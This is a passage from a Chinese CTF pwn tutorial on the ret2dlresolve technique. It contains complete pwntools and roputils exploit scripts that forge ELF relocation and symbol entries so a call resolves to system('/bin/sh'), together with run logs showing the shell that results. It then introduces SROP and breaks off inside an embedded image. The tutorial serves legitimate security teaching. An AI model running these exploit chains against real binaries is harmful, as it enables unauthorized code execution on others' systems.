align\nindex_dynsym = (\n    fake_sym_addr - dynsym) / 0x10  # calculate the dynsym index of write\nfake_write_sym = flat([0x4c, 0, 0, 0x12])\n### making fake write relocation\n## making base_stage+24 ---> fake reloc\nindex_offset = base_stage + 24 - rel_plt\nwrite_got = elf.got['write']\nr_info = (index_dynsym << 8) | 0x7\nfake_write_reloc = flat([write_got, r_info])\nrop.raw(plt0)\nrop.raw(index_offset)\n## fake ret addr of write\nrop.raw('bbbb')\nrop.raw(1)\nrop.raw(base_stage + 80)\nrop.raw(len(sh))\nrop.raw(fake_write_reloc)  # fake write reloc\nrop.raw('a' * align)  # padding\nrop.raw(fake_write_sym)  # fake write symbol\nrop.raw('a' * (80 - len(rop.chain())))\nrop.raw(sh)\nrop.raw('a' * (100 - len(rop.chain())))\nr.sendline(rop.chain())\nr.interactive()\n```\n\n具体效果如下\n\n```assembly\n➜  ret2dlresolve git:(master) ✗ python stage4.py\n[*] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main'\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x8048000)\n[+] Starting local process './main': pid 128795\n[*] Loaded cached gadgets for './main'\n[*] Switching to interactive mode\n/bin/sh[*] Got EOF while reading in interactive\n```\n\n**stage 5**\n\n这一阶段，我们将在阶段4的基础上，我们进一步使得write符号的st_name指向我们自己构造的字符串。\n\n```python\nfrom pwn import *\nelf = ELF('main')\nr = process('./main')\nrop = ROP('./main')\noffset = 112\nbss_addr = elf.bss()\nr.recvuntil('Welcome to XDCTF2015~!\\n')\n## stack privot to bss segment\n## new stack size is 0x800\nstack_size = 0x800\nbase_stage = bss_addr + stack_size\n### padding\nrop.raw('a' * offset)\n### read 100 byte to base_stage\nrop.read(0, base_stage, 100)\n### stack privot, set esp = base_stage\nrop.migrate(base_stage)\nr.sendline(rop.chain())\n## write sh=\"/bin/sh\"\nrop = ROP('./main')\nsh = \"/bin/sh\"\nplt0 = elf.get_section_by_name('.plt').header.sh_addr\nrel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr\ndynsym = elf.get_section_by_name('.dynsym').header.sh_addr\ndynstr = elf.get_section_by_name('.dynstr').header.sh_addr\n### making fake write symbol\nfake_sym_addr = base_stage + 32\nalign = 0x10 - ((fake_sym_addr - dynsym) & 0xf\n                )  # since the size of item(Elf32_Symbol) of dynsym is 0x10\nfake_sym_addr = fake_sym_addr + align\nindex_dynsym = (\n    fake_sym_addr - dynsym) / 0x10  # calculate the dynsym index of write\n## plus 10 since the size of Elf32_Sym is 16.\nst_name = fake_sym_addr + 0x10 - dynstr\nfake_write_sym = flat([st_name, 0, 0, 0x12])\n### making fake write relocation\n## making base_stage+24 ---> fake reloc\nindex_offset = base_stage + 24 - rel_plt\nwrite_got = elf.got['write']\nr_info = (index_dynsym << 8) | 0x7\nfake_write_reloc = flat([write_got, r_info])\nrop.raw(plt0)\nrop.raw(index_offset)\n## fake ret addr of write\nrop.raw('bbbb')\nrop.raw(1)\nrop.raw(base_stage + 80)\nrop.raw(len(sh))\nrop.raw(fake_write_reloc)  # fake write reloc\nrop.raw('a' * align)  # padding\nrop.raw(fake_write_sym)  # fake write symbol\nrop.raw('write\\x00')  # there must be a \\x00 to mark the end of string\nrop.raw('a' * (80 - len(rop.chain())))\nrop.raw(sh)\nrop.raw('a' * (100 - len(rop.chain())))\nr.sendline(rop.chain())\nr.interactive()\n```\n\n效果如下\n\n```assembly\n➜  ret2dlresolve git:(master) ✗ python stage5.py      \n[*] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main'\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x8048000)\n[+] Starting local process './main': pid 129249\n[*] Loaded cached gadgets for './main'\n[*] Switching to interactive mode\n/bin/sh[*] Got EOF while reading in interactive\n```\n\n**stage 6**\n\n这一阶段，我们只需要将原先的write字符串修改为system字符串，同时修改write的参数为system的参数即可获取shell。这是因为，dl_resolve最终依赖的是我们所给定的字符串，即使我们给了一个假的字符串它仍然会去解析并执行。具体代码如下\n\n```python\nfrom pwn import *\nelf = ELF('main')\nr = process('./main')\nrop = ROP('./main')\noffset = 112\nbss_addr = elf.bss()\nr.recvuntil('Welcome to XDCTF2015~!\\n')\n## stack privot to bss segment\n## new stack size is 0x800\nstack_size = 0x800\nbase_stage = bss_addr + stack_size\n### padding\nrop.raw('a' * offset)\n### read 100 byte to base_stage\nrop.read(0, base_stage, 100)\n### stack privot, set esp = base_stage\nrop.migrate(base_stage)\nr.sendline(rop.chain())\n## write sh=\"/bin/sh\"\nrop = ROP('./main')\nsh = \"/bin/sh\"\nplt0 = elf.get_section_by_name('.plt').header.sh_addr\nrel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr\ndynsym = elf.get_section_by_name('.dynsym').header.sh_addr\ndynstr = elf.get_section_by_name('.dynstr').header.sh_addr\n### making fake write symbol\nfake_sym_addr = base_stage + 32\nalign = 0x10 - ((fake_sym_addr - dynsym) & 0xf\n                )  # since the size of item(Elf32_Symbol) of dynsym is 0x10\nfake_sym_addr = fake_sym_addr + align\nindex_dynsym = (\n    fake_sym_addr - dynsym) / 0x10  # calculate the dynsym index of write\n## plus 10 since the size of Elf32_Sym is 16.\nst_name = fake_sym_addr + 0x10 - dynstr\nfake_write_sym = flat([st_name, 0, 0, 0x12])\n### making fake write relocation\n## making base_stage+24 ---> fake reloc\nindex_offset = base_stage + 24 - rel_plt\nwrite_got = elf.got['write']\nr_info = (index_dynsym << 8) | 0x7\nfake_write_reloc = flat([write_got, r_info])\nrop.raw(plt0)\nrop.raw(index_offset)\n## fake ret addr of write\nrop.raw('bbbb')\nrop.raw(base_stage + 82)\nrop.raw('bbbb')\nrop.raw('bbbb')\nrop.raw(fake_write_reloc)  # fake write reloc\nrop.raw('a' * align)  # padding\nrop.raw(fake_write_sym)  # fake write symbol\nrop.raw('system\\x00')  # there must be a \\x00 to mark the end of string\nrop.raw('a' * (80 - len(rop.chain())))\nprint rop.dump()\nprint len(rop.chain())\nrop.raw(sh + '\\x00')\nrop.raw('a' * (100 - len(rop.chain())))\nr.sendline(rop.chain())\nr.interactive()\n```\n\n需要注意的是，这里我'/bin/sh'的偏移我修改为了82，这是因为pwntools中它会自动帮你对齐字符串。。。下面这一行说明了问题。\n\n0x0050:      'aara'\n\n效果如下\n\n```python\n➜  ret2dlresolve git:(master) ✗ python stage6.py\n[*] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main'\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x8048000)\n[+] Starting local process './main': pid 130415\n[*] Loaded cached gadgets for './main'\n0x0000:        0x8048380\n0x0004:           0x2528\n0x0008:           'bbbb' 'bbbb'\n0x000c:        0x804a892\n0x0010:           'bbbb' 'bbbb'\n0x0014:           'bbbb' 'bbbb'\n0x0018: '\\x1c\\xa0\\x04\\x08' '\\x1c\\xa0\\x04\\x08\\x07i\\x02\\x00'\n0x001c:  '\\x07i\\x02\\x00'\n0x0020:           'aaaa' 'aaaaaaaa'\n0x0024:           'aaaa'\n0x0028:  '\\x00&\\x00\\x00' '\\x00&\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x12\\x00\\x00\\x00'\n0x002c: '\\x00\\x00\\x00\\x00'\n0x0030: '\\x00\\x00\\x00\\x00'\n0x0034: '\\x12\\x00\\x00\\x00'\n0x0038:           'syst' 'system\\x00'\n0x003c:        'em\\x00o'\n0x0040:             'aa'\n0x0044:           'aaaa' 'aaaaaaaaaaaaaa'\n0x0048:           'aaaa'\n0x004c:           'aaaa'\n0x0050:           'aara'\n82\n[*] Switching to interactive mode\n/bin/sh: 1: xa: not found\n$ ls\ncore  main.c     stage2.py  stage4.py  stage6.py\nmain  stage1.py  stage3.py  stage5.py\n```\n\n**工具攻击**\n\n根据上面的介绍，我们应该很容易可以理解这个攻击了。下面我们直接使用roputil来进行攻击。代码如下\n\n```python\nfrom roputils import *\nfrom pwn import process\nfrom pwn import gdb\nfrom pwn import context\nr = process('./main')\ncontext.log_level = 'debug'\nr.recv()\nrop = ROP('./main')\noffset = 112\nbss_base = rop.section('.bss')\nbuf = rop.fill(offset)\nbuf += rop.call('read', 0, bss_base, 100)\n## used to call dl_Resolve()\nbuf += rop.dl_resolve_call(bss_base + 20, bss_base)\nr.send(buf)\nbuf = rop.string('/bin/sh')\nbuf += rop.fill(20, buf)\n## used to make faking data, such relocation, Symbol, Str\nbuf += rop.dl_resolve_data(bss_base + 20, 'system')\nbuf += rop.fill(100, buf)\nr.send(buf)\nr.interactive()\n```\n\n关于dl_resolve_call与dl_resolve_data的具体细节请参考roputils.py的源码，比较容易理解，需要注意的是，dl_resolve执行完之后也是需要有对应的返回地址的。\n\n效果如下\n\n```assembly\n➜  ret2dlresolve git:(master) ✗ python roptool.py                       \n[+] Starting local process './main': pid 6114\n[DEBUG] Received 0x17 bytes:\n    'Welcome to XDCTF2015~!\\n'\n[DEBUG] Sent 0x94 bytes:\n    00000000  46 4c 68 78  52 36 67 6e  65 47 53 58  71 77 51 49  │FLhx│R6gn│eGSX│qwQI│\n    00000010  32 43 6c 49  77 76 51 33  47 49 4a 59  50 74 6c 38  │2ClI│wvQ3│GIJY│Ptl8│\n    00000020  57 54 68 4a  63 48 39 62  46 55 52 58  50 73 38 64  │WThJ│cH9b│FURX│Ps8d│\n    00000030  72 4c 38 63  50 79 37 73  55 45 7a 32  6f 59 5a 42  │rL8c│Py7s│UEz2│oYZB│\n    00000040  76 59 32 43  74 75 77 6f  70 56 61 44  6a 73 35 6b  │vY2C│tuwo│pVaD│js5k│\n    00000050  41 77 78 77  49 72 7a 49  70 4d 31 67  52 6f 44 6f  │Awxw│IrzI│pM1g│RoDo│\n    00000060  43 44 43 6e  45 31 50 48  53 73 64 30  6d 54 7a 5a  │CDCn│E1PH│Ssd0│mTzZ│\n    00000070  a0 83 04 08  19 86 04 08  00 00 00 00  40 a0 04 08  │····│····│····│@···│\n    00000080  64 00 00 00  80 83 04 08  28 1d 00 00  79 83 04 08  │d···│····│(···│y···│\n    00000090  40 a0 04 08                                         │@···││\n    00000094\n[DEBUG] Sent 0x64 bytes:\n    00000000  2f 62 69 6e  2f 73 68 00  73 52 46 66  57 43 59 52  │/bin│/sh·│sRFf│WCYR│\n    00000010  66 4c 35 52  78 49 4c 53  54 a0 04 08  07 e9 01 00  │fL5R│xILS│T···│····│\n    00000020  6e 6b 45 32  52 76 73 6c  00 1e 00 00  00 00 00 00  │nkE2│Rvsl│····│····│\n    00000030  00 00 00 00  12 00 00 00  73 79 73 74  65 6d 00 74  │····│····│syst│em·t│\n    00000040  5a 4f 4e 6c  6c 73 4b 5a  76 53 48 6e  38 37 49 47  │ZONl│lsKZ│vSHn│87IG│\n    00000050  69 49 52 6c  50 44 38 67  45 77 75 6c  72 47 6f 67  │iIRl│PD8g│Ewul│rGog│\n    00000060  55 41 52 4f                                         │UARO││\n    00000064\n[*] Switching to interactive mode\n$ ls\n[DEBUG] Sent 0x3 bytes:\n    'ls\\n'\n[DEBUG] Received 0x8d bytes:\n    'core\\t     main    roptool.py   roputils.pyc\\tstage2.py  stage4.py  stage6.py\\n'\n    '__init__.py  main.c  roputils.py  stage1.py\\tstage3.py  stage5.py\\n'\ncore         main    roptool.py   roputils.pyc    stage2.py  stage4.py  stage6.py\n__init__.py  main.c  roputils.py  stage1.py    stage3.py  stage5.py\n```\n\n**SROP**\n\nSROP(Sigreturn Oriented Programming)于2014年被Vrije Universiteit Amsterdam的Erik Bosman提出，其相关研究**Framing Signals — A Return to Portable Shellcode**发表在安全顶级会SP2014上，被评选为当年的Best Student Papers。\n\n**signal机制**\n\nsignal机制是类unix系统中进程之间相互传递信息的一种方法。一般，我们也称其为软中断信号，或者软中断。比如说，进程之间可以通过系统调用kill来发送软中断信号。一般来说，信号机制常见的步骤如下图所示\n\n![Process of Signal Handlering](data:image/png;base64,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IENvcmUgNS40LjAiPgogICA8cmRmOlJERiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPgogICAgICA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIgogICAgICAgICAgICB4bWxuczpleGlmPSJodHRwOi8vbnMuYWRvYmUuY29tL2V4aWYvMS4wLyI+CiAgICAgICAgIDxleGlmOlBpeGVsWERpbWVuc2lvbj44MTY8L2V4aWY6UGl4ZWxYRGltZW5zaW9uPgogICAgICAgICA8ZXhpZjpQaXhlbFlEaW1lbnNpb24+MjY2PC9leGlmOlBpeGVsWURpbWVuc2lvbj4KICAgICAgPC9yZGY6RGVzY3JpcHRpb24+CiAgIDwvcmRmOlJERj4KPC94OnhtcG1ldGE+CkXEHR8AAEAASURBVHgB7J0HmFxV+cZPNtn0QgihRAktFEPvRXqR3hERUDqIglQBAZWOSAmggAhSpEn5UwQpoQhIlRo6oYTQQi8JqZtk/t/vu3sms7Mz2zKzO3fm/Z5ndu7ce8p33js797znK6dbxiRIhIAQEAJCQAgIASEgBISAEBACKUCgLgU6SkUhIASEgBAQAkJACAgBISAEhIAjIAKjL4IQEAJCQAgIASEgBISAEBACqUFABCY1t0qKCgEhIASEgBAQAkJACAgBISACo++AEBACQkAICAEhIASEgBAQAqlBQAQmNbdKigoBISAEhIAQEAJCQAgIASEgAqPvgBAQAkJACAgBISAEhIAQEAKpQUAEJjW3SooKASEgBISAEBACQkAICAEhIAKj74AQEAJCQAgIASEgBISAEBACqUFABCY1t0qKCgEhIASEgBAQAkJACAgBISACo++AEBACQkAICAEhIASEgBAQAqlBQAQmNbdKigo